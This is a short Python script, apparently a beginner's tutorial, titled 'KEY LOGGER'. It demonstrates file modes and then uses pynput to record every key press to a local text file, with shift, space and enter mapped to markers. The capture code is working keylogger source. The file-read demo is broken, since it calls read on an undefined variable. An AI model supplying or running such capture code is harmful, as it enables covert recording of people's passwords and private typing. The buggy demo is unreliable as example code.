# KEY LOGGER

from pynput.keyboard import Listener

# 'w', 'a', 'r'
# write, append, read


# -- Write --

f = open('log.text', 'w')
f.write("Hello World")
f.close()


# -- Read --

f = open('log.text', 'r')
data = r.read()
print(data)
f.close()


# -- Append --

f = open('log.text', 'a')
f.write('Hello World')
f.close()



# -- with keyword --

with open('log.text', 'w') as f:
	f.write("Hello World")



def write_to_file(key):
	
	letter = str(key)
	letter = letter.replace("'", "")

	if(letter == 'Key.space'):
		letter = ' '

	if(letter == 'Key.shift'):
		letter = "[SHIFT]"

	if(letter == "Key.ctrl"):
		letter = ""
	
	if(letter == "Key.enter"):
		letter = "\n"

	with open("log.text", 'a') as f:
		f.write(letter)


with Listener(on_press = write_to_file) as l:
	l.join()


# 'with' will automatically close the listener. When we stop the program the memory allocated
# to this listener won't be released. 'with' makes sure whatever happens, when an error is there
# or the program stops the memory is released. It's just a good coding principle to follow